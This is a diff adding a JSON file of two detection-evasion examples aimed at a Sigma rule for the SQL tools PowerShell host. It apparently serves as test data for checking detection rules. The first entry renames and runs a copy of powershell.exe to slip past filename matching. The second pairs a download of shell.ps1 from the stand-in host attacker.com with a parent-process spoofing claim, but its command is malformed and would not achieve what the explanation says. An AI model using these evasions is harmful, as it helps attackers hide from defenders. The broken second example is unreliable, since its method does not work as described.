@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe %TEMP%\\not_sqltools.exe && %TEMP%\\not_sqltools.exe -Command \"Write-Host 'Malicious Payload Here'\"",
+    "explanation": "The Sigma rule relies on specific file names ('sqltoolsps.exe') in the Image, ParentImage, or OriginalFileName fields. By simply renaming the executable or using a standard PowerShell instance renamed to something else, the 'selection' criteria is never met. This bypasses the rule because the detection logic is strictly tied to the string literal of the SQL tool's filename."
+  },
+  {
+    "output": "C:\\Windows\\System32\\smss.exe -ExecutionParam \"sqltoolsps.exe -Command 'Invoke-WebRequest http://attacker.com/shell.ps1'\"",
+    "explanation": "The rule contains a exclusion filter where if the ParentImage ends with '\\smss.exe', the alert is suppressed. An attacker can use techniques like Parent PID Spoofing to make 'smss.exe' appear as the parent process of the 'sqltoolsps.exe' execution, effectively triggering the filter and silencing the detection."
+  }
+]
